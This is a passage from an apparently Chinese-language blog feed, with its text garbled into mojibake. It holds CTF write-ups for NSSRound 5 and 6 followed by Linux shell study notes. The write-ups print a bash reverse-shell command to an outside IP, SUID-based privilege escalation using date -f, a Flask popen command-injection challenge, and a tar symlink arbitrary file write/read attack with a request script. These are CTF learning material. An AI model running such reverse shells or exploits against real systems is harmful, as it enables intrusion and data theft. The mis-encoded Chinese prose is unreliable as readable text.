ä¸ºä¹‹å‰å“ªä¸€å‘¨çš„miscæ˜¯ç”¨åˆ°äº†è¿™ä¸ªçŸ¥è¯†ç‚¹ã€‚</p><p>ä½†æ˜¯æ²¡æœ‰æƒ³åˆ°çš„æ˜¯èšå‰‘çš„ç»ˆç«¯å¤ªä¸å¥½ç”¨äº†ï¼ˆå…¶å®æˆ‘ä¹‹å‰è§‰å¾—èšå‰‘æŒºå¼ºçš„ï¼Œå› ä¸ºå®ƒè‡ªå¸¦é‚£äº›ç»•è¿‡æ’ä»¶ï¼‰</p><p>æ¯”å¦‚å˜é‡èµ‹å€¼æ²¡ç”¨</p><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019102635-1686150281426.png" alt="QQå›¾ç‰‡20221019102635"></p><p>æŸ¥æ‰¾å…·æœ‰suidçš„å‘½ä»¤æ²¡ç”¨</p><p><img src="/../images/image-20221019102841851-1686150281426.png" alt="image-20221019102841851"></p><p>åå¼¹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">www-data@out:/$ find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/bin/date</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line"></span><br><span class="line">www-data@out:/$ date -f ffll444aaggg</span><br><span class="line">date -f ffll444aaggg</span><br><span class="line">date: invalid date &#x27;flag&#123;1f005b40-39e2-4538-8816-3e27bdd98352&#125;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/QQ%E5%9B%BE%E7%89%8720221019103452-1686150281426.png" alt="QQå›¾ç‰‡20221019103452"></p><h4 id="final-round"><a href="#final-round" class="headerlink" title="final round"></a>final round</h4><p>æ—¶é—´ç›²æ³¨</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 5</title>
      <link href="/2023/05/31/NSSRound5/"/>
      <url>/2023/05/31/NSSRound5/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Å‡Å›Å›&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>æ€è·¯ä¸€ï¼Œç”¨&#x2F;flagè¦†ç›–app.pyæ–‡ä»¶ï¼Œå†è®¿é—®&#x2F;sourceè·¯ç”±</p><p>è¿™é‡Œè¦†ç›–å®Œäº†ä¹‹åï¼Œè¿˜å¯ä»¥è®¿é—®è·¯ç”±çš„åŸå› æ˜¯<code>debug=False</code>ï¼Œæ‰€ä»¥å³ä½¿è¦†ç›–äº†app.pyæ–‡ä»¶ï¼Œä½†æ˜¯flaskè¿è¡Œæ‰€ä½¿ç”¨çš„æ–‡ä»¶å¹¶æ²¡æœ‰å—åˆ°å½±å“ã€‚</p><p>è€Œå¦‚æœ<code>debug=True</code>ï¼Œå½“æˆ‘ä»¬ä¿®æ”¹æ–‡ä»¶æ—¶ï¼Œflaskå°±ä¼šè‡ªåŠ¨é‡è½½æ–‡ä»¶ã€‚</p><p>æ­¤æ—¶è¦†ç›–flaskè¿è¡Œæ–‡ä»¶ï¼ˆæˆ‘æœ¬åœ°æ˜¯pyrce.pyï¼‰</p><p>æ§åˆ¶å°</p><p><img src="/../images/image-20221022132313611-1686150585118.png" alt="image-20221022132313611"></p><p>è®¿é—®&#x2F;sourceè·¯ç”±</p><p><img src="/../images/image-20221022132349822-1686150585118.png" alt="image-20221022132349822"></p><p>æ€è·¯äºŒï¼Œåˆ©ç”¨å¯ä»¥è®¿é—®é™æ€æ–‡ä»¶ï¼Œå…ˆåˆ›å»ºstaticç›®å½•ï¼ˆflaskæ¡†æ¶ç»“æ„ï¼Œé™æ€æ–‡ä»¶æ”¾åœ¨staticç›®å½•ä¸‹ï¼‰ï¼Œå†å°†flagå¤åˆ¶åˆ°staticç›®å½•ï¼Œè®¿é—®&#x2F;static&#x2F;flagå°±èƒ½å¤Ÿä¸‹è½½flagæ–‡ä»¶ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSRound 6</title>
      <link href="/2023/05/31/NSSRound6/"/>
      <url>/2023/05/31/NSSRound6/</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-6-Team-check"><a href="#NSSRound-6-Team-check" class="headerlink" title="[NSSRound#6 Team]check"></a>[NSSRound#6 Team]check</h1><h2 id="V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ "><a href="#V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ "></a>V1â€“ä»»æ„æ–‡ä»¶ä¸Šä¼ </h2><blockquote><p>æœåŠ¡ç«¯å¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹æ“ä½œï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹å‹ç¼©åŒ…å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç¬¦å·é“¾æ¥è¾¾åˆ°ä»»æ„è¦†ç›–&#x2F;ä¸Šä¼ æ–‡ä»¶çš„æ•ˆæœã€‚</p></blockquote><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><p>å‡è®¾æˆ‘ä»¬è¦è¦†ç›–&#x2F;home&#x2F;khaz&#x2F;shellç›®å½•ä¸‹çš„1.shæ–‡ä»¶</p><p><img src="/../images/image-20221020234420015-1686150537835.png" alt="image-20221020234420015"></p><p>é‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆå¯ä»¥å…ˆåˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æŒ‡å‘è¿™ä¸ªç›®å½•ï¼Œå¹¶å°†å…¶æ‰“åŒ…æˆå‹ç¼©åŒ…1ã€‚</p><p><img src="/../images/image-20221020234340481-1686150537835.png" alt="image-20221020234340481"></p><p>ç„¶åæˆ‘ä»¬éœ€è¦å†åˆ›å»ºä¸€ä¸ªä¸è½¯é“¾æ¥åå­—ç›¸åŒçš„ç›®å½•ï¼Œå¹¶åœ¨è¿™ä¸ªç›®å½•ä¸‹åˆ›å»ºè¦è¦†ç›–çš„æ–‡ä»¶ã€‚ç„¶åå°†è¯¥ç›®å½•æ‰“åŒ…ä¸ºå‹ç¼©åŒ…2ã€‚</p><p><img src="/../images/image-20221020234743494-1686150537835.png" alt="image-20221020234743494"></p><p>ç„¶åè§£å‹å‹ç¼©åŒ…1ï¼Œå¾—åˆ°testï¼Œç„¶åè§£å‹å‹ç¼©åŒ…2ï¼Œå…¶ä¸­test&#x2F;clean.shï¼Œå› ä¸ºå½“å‰ç›®å½•ä¸‹testæ˜¯æŒ‡å‘&#x2F;home&#x2F;khaz&#x2F;shellçš„ï¼Œæ‰€ä»¥å®é™…ä¸Šä¼šå°†clean.shè§£å‹åˆ°&#x2F;home&#x2F;khaz&#x2F;shellä¸‹ä»è€Œè¦†ç›–åŸæ¥çš„clean.shã€‚</p><p><img src="/../images/image-20221020234513190-1686150537835.png" alt="image-20221020234513190"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">        tar = tarfile.<span class="built_in">open</span>(file_save_path, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        tar.extractall(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>])</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;/tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>åšçš„æ—¶å€™ï¼Œå‘ç°åå¼¹shellä¸ç”Ÿæ•ˆï¼Œåœ¨æœ¬åœ°æµ‹è¯•åå‘ç°æ˜¯å› ä¸ºæ²¡æœ‰ç»™clean.shæƒé™ï¼Œæ‰€ä»¥è¦†ç›–åå°±ä¸èƒ½æ‰§è¡Œäº†ã€‚</p><p><img src="/../images/Snipaste_2022-10-21_18-51-12-1686150537835.png" alt="Snipaste_2022-10-21_18-51-12"></p><p>psï¼šè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ€è·¯å°±æ˜¯æ—¢ç„¶å¯ä»¥ä»»æ„ä¸Šä¼ &#x2F;è¦†ç›–æ–‡ä»¶ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥è¦†ç›–app.pyæ–‡ä»¶ã€‚</p><p>â€‹è¿™æ˜¯å› ä¸ºæ¯æ¬¡ä¿®æ”¹å·¥ä½œç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œflaskéƒ½ä¼šè‡ªåŠ¨é‡è½½æ–‡ä»¶ã€‚</p><p><img src="/../images/image-20221021202646267-1686150537835.png" alt="image-20221021202646267"></p><h2 id="V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½"><a href="#V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½"></a>V2â€“ä»»æ„æ–‡ä»¶ä¸‹è½½</h2><blockquote><p>æœåŠ¡ç«¯å¯¹ä¸Šä¼ çš„å‹ç¼©åŒ…è¿›è¡Œè§£å‹æ“ä½œï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹å‹ç¼©åŒ…å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œå¹¶æä¾›ä¸‹è½½åŠŸèƒ½ã€‚å¯¼è‡´è§£å‹å‡ºæ¥çš„æ–‡ä»¶å¦‚æœæ˜¯ç¬¦å·é“¾æ¥æ–‡ä»¶å°±å¯ä»¥ä¸‹è½½ä»»æ„æ–‡ä»¶ã€‚</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>():</span><br><span class="line">    filename = request.form.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(filepath) <span class="keyword">or</span> <span class="keyword">not</span> os.path.isfile(filepath):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clean&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_file</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;su ctf -c /tmp/clean.sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>ä¸v1ç›¸æ¯”ä¸åŒç‚¹åœ¨äº<code>su ctf -c /tmp/clean.sh</code>é™åˆ¶äº†ç”¨æˆ·æƒé™ï¼Œä½†æ˜¯flaskè¿˜æ˜¯ä»¥rootæƒé™å¯åŠ¨çš„ï¼Œæ‰€ä»¥ä¸‹è½½åŠŸèƒ½è¿˜æ˜¯rootæƒé™ã€‚</p><p>æ„é€ ç¬¦å·é“¾æ¥æŒ‡å‘<code>/flag</code>ï¼Œåˆ©ç”¨ä¸‹è½½åŠŸèƒ½å°±èƒ½å¤Ÿè¯»å–åˆ°flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28187/download&quot;</span></span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;filename&quot;</span>: <span class="string">&quot;test2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=params).text</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>&lt;&lt;Linuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨&gt;&gt; ç¬”è®°</title>
      <link href="/2023/05/31/linux-shell/"/>
      <url>/2023/05/31/linux-shell/</url>
      
        <content type="html"><![CDATA[<p>å‰è¨€ï¼š</p><p>ä»¥ä¸‹å†…å®¹ä¸ºé˜…è¯»<code>Linuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ (å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰) (z-lib.org)</code>ç¬”è®°ã€‚</p><p>æ³¨ï¼šä¸‹é¢ä½¿ç”¨çš„linuxç³»ç»Ÿä¸ºé˜¿é‡Œäº‘æœåŠ¡å™¨Centos7ï¼ˆredhatï¼‰æˆ–è€…kaliï¼ˆdebianï¼‰ç³»ç»Ÿ</p><hr><h1 id="äº†è§£shell"><a href="#äº†è§£shell" class="headerlink" title="äº†è§£shell"></a>äº†è§£shell</h1><h3 id="shellç±»å‹"><a href="#shellç±»å‹" class="headerlink" title="shellç±»å‹"></a>shellç±»å‹</h3><p><img src="/../images/image-20220818151112756-1686151304118.png" alt="image-20220818151112756"></p><blockquote><p>å½“ç”¨æˆ·ç™»å½•ç»ˆç«¯çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šå¯åŠ¨ä¸€ä¸ªé»˜è®¤çš„äº¤äº’å¼shellã€‚</p><p>ç³»ç»Ÿç©¶ç«Ÿå¯åŠ¨å“ªä¸ªshellï¼Œè¿™å–å†³äºç”¨æˆ·IDé…ç½®ç³»ç»Ÿå¯åŠ¨ä»€ä¹ˆæ ·çš„shellç¨‹åºã€‚</p><p>åœ¨&#x2F;etc&#x2F;passwdæ–‡ä»¶ä¸­ï¼Œåœ¨ç”¨æˆ·IDè®°å½•çš„ç¬¬7ä¸ªå­—æ®µä¸­åˆ—å‡ºäº†é»˜è®¤çš„shellç¨‹åºã€‚</p></blockquote><p>ä¾‹å¦‚åœ¨kaliä¸­ç™»å½•ç»ˆç«¯æ—¶ä½¿ç”¨çš„æ˜¯zshç±»å‹çš„shell.</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line"></span><br><span class="line">khaz: x:1000:1000:khaz,,,:/home/khaz:/usr/bin/zsh</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ ls -F /usr/bin/zsh</span><br><span class="line">/usr/bin/zsh*</span><br></pre></td></tr></table></figure><p>è¯´æ˜&#x2F;usr&#x2F;bin&#x2F;zshæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ ls -l /bin/sh</span><br><span class="line">lrwxrwxrwx 1 root root 4  3æœˆ 14  2022 /bin/sh -&gt; dash</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ç”¨æˆ·å’Œç³»ç»Ÿä½¿ç”¨çš„shellç±»å‹ä¸åŒã€‚</p><p>æŸ¥çœ‹æ‰€æœ‰shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ cat /etc/shells</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/etc/shells: valid login shells</span></span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/usr/bin/bash</span><br><span class="line">/bin/rbash</span><br><span class="line">/usr/bin/rbash</span><br><span class="line">/bin/dash</span><br><span class="line">/usr/bin/dash</span><br><span class="line">/usr/bin/tmux</span><br><span class="line">/usr/bin/screen</span><br><span class="line">/bin/zsh</span><br><span class="line">/usr/bin/zsh</span><br></pre></td></tr></table></figure><blockquote><p>é€šå¸¸è¯´çš„shåªæ˜¯ä¸€ä¸ªè½¯è¿æ¥ï¼Œå¹¶ä¸æ˜¯çœŸçš„æœ‰ä¸€ä¸ªshellå«shã€‚</p><p>åœ¨debianç³»æ“ä½œç³»ç»Ÿä¸­ï¼ŒshæŒ‡å‘dashï¼›</p><p>åœ¨centosç³»æ“ä½œç³»ç»Ÿä¸­ï¼ŒshæŒ‡å‘bashã€‚</p></blockquote><h3 id="shellçš„çˆ¶å­å…³ç³»"><a href="#shellçš„çˆ¶å­å…³ç³»" class="headerlink" title="shellçš„çˆ¶å­å…³ç³»"></a>shellçš„çˆ¶å­å…³ç³»</h3><p><img src="/../images/image-20220819202328859-1686151304119.png" alt="image-20220819202328859"></p><p>åœ¨å³è¾¹çš„å‘½ä»¤è¡Œä¸­å¯ä»¥çœ‹åˆ°bashè¿›ç¨‹çš„ppidå°±æ˜¯&#x2F;user&#x2F;bin&#x2F;zshçš„pidï¼Œæ‰€ä»¥äºŒè€…æ˜¯çˆ¶å­å…³ç³»ã€‚</p><img src="E:\typora img\image-20220819202343322.png" alt="image-20220819202343322" style="zoom: 80%;" /><p>å¤šæ¬¡åˆ›å»ºbash</p><img src="E:\typora img\image-20220819203036919.png" alt="image-20220819203036919" style="zoom: 67%;" /><img src="E:\typora img\image-20220819203046906.png" alt="image-20220819203046906" style="zoom:67%;" /><p>é€€å‡ºå½“å‰shellï¼Œ<code>exit</code></p><img src="E:\typora img\image-20220819203202199.png" alt="image-20220819203202199" style="zoom:67%;" /><p>å¯åŠ¨shellæ—¶çš„å‚æ•°</p><img src="E:\typora img\image-20220923170946734.png" alt="image-20220923170946734" style="zoom:67%;" title=1/><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">khaz@DESKTOP-JCNAFF7:~$ bash -r</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$ cd ../</span><br><span class="line">bash: cd: restricted</span><br><span class="line">khaz@DESKTOP-JCNAFF7:~$</span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤åˆ—è¡¨"><a href="#å‘½ä»¤åˆ—è¡¨" class="headerlink" title="å‘½ä»¤åˆ—è¡¨"></a>å‘½ä»¤åˆ—è¡¨</h3><blockquote><p>ä»¥;éš”å¼€çš„å¤šä¸ªå‘½ä»¤</p></blockquote><p><code>pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL</code></p><p>è¿›ç¨‹åˆ—è¡¨</p><blockquote><p>åˆ›å»ºä¸€ä¸ªå­shellæ¥æ‰§è¡Œå‘½ä»¤åˆ—è¡¨</p></blockquote><p><code> (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</code></p><p><code>echo $BASH_SUBSHELL</code>ï¼šè¾“å‡ºå­shellæ•°é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]#  (pwd ; ls ; cd /etc ; pwd ; cd ; pwd ; ls ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">/etc</span><br><span class="line">/root</span><br><span class="line">H1ve  web</span><br><span class="line">1</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ; echo $BASH_SUBSHELL)</span><br><span class="line">/root</span><br><span class="line">1</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ( pwd ;(echo $BASH_SUBSHELL))</span><br><span class="line">/root</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæœ‰å‡ ä¸ªæ‹¬å·å°±æœ‰å‡ ä¸ªå­shell</p><h1 id="ä½¿ç”¨linuxç¯å¢ƒå˜é‡"><a href="#ä½¿ç”¨linuxç¯å¢ƒå˜é‡" class="headerlink" title="ä½¿ç”¨linuxç¯å¢ƒå˜é‡"></a>ä½¿ç”¨linuxç¯å¢ƒå˜é‡</h1><ul><li><p>å®šä¹‰</p><blockquote><p><strong>å­˜å‚¨æœ‰å…³shellä¼šè¯å’Œå·¥ä½œç¯å¢ƒçš„ä¿¡æ¯çš„å˜é‡ç§°ä¸ºç¯å¢ƒå˜é‡</strong></p></blockquote></li><li><p>åˆ†ç±»</p><ul><li><p>å…¨å±€å˜é‡</p></li><li><p>å±€éƒ¨å˜é‡</p><blockquote><p>è¿™é‡Œçš„èŒƒå›´æŒ‡çš„æ˜¯å˜é‡å­˜åœ¨äºå“ªäº›shellä¼šè¯ä¸­</p></blockquote></li></ul></li></ul><h3 id="å…¨å±€ç¯å¢ƒå˜é‡"><a href="#å…¨å±€ç¯å¢ƒå˜é‡" class="headerlink" title="å…¨å±€ç¯å¢ƒå˜é‡"></a>å…¨å±€ç¯å¢ƒå˜é‡</h3><blockquote><p>ç³»ç»Ÿç¯å¢ƒå˜é‡åŸºæœ¬ä¸Šéƒ½æ˜¯ä½¿ç”¨å…¨å¤§å†™å­—æ¯ï¼Œä»¥åŒºåˆ«äºæ™®é€šç”¨æˆ·çš„ç¯å¢ƒå˜é‡ã€‚</p></blockquote><p>æŸ¥çœ‹å…¨å±€å˜é‡</p><ul><li><p><code>env</code> æˆ–è€…<code>printenv</code>ï¼š<strong>åª</strong>è¾“å‡ºå…¨éƒ¨çš„<strong>å…¨å±€</strong>å˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# env  (printenvè¾“å‡ºçš„ä¸å…¶ç›¸åŒ)</span><br><span class="line">XDG_SESSION_ID=897</span><br><span class="line">HOSTNAME=izwz99bgx9y93dmv0mir0ez</span><br><span class="line">TERM=xterm</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SSH_TTY=/dev/pts/0</span><br><span class="line">USER=root</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li><li><p><code>printenv  var_name</code>æˆ–è€… <code>echo $var_name</code>ï¼šè¾“å‡ºç‰¹å®šå˜é‡çš„å€¼ã€‚</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# printenv USER</span><br><span class="line">root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $USER</span><br><span class="line">root</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>å…¨å±€ç¯å¢ƒå˜é‡å­˜åœ¨äºæ‰€æœ‰çš„shellä¼šè¯ä¸­</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# bash</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11371 11337  0 20:31 pts/0    00:00:00 bash</span><br><span class="line">root     11382 11371  0 20:31 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# exit</span><br><span class="line">exit</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# ps -f</span><br><span class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root     11337 11335  0 20:14 pts/0    00:00:00 -bash</span><br><span class="line">root     11383 11337  0 20:32 pts/0    00:00:00 ps -f</span><br><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# echo $HOME</span><br><span class="line">/root</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç”¨bashå‘½ä»¤ç”Ÿæˆä¸€ä¸ªå­shellåï¼Œæ˜¾ç¤ºäº†HOMEç¯å¢ƒå˜é‡çš„å½“å‰å€¼ï¼Œè¿™ä¸ªå€¼å’Œçˆ¶shellä¸­çš„ä¸€æ¨¡ä¸€æ ·ï¼Œéƒ½æ˜¯&#x2F;rootã€‚</p></blockquote><h3 id="å±€éƒ¨ç¯å¢ƒå˜é‡"><a href="#å±€éƒ¨ç¯å¢ƒå˜é‡" class="headerlink" 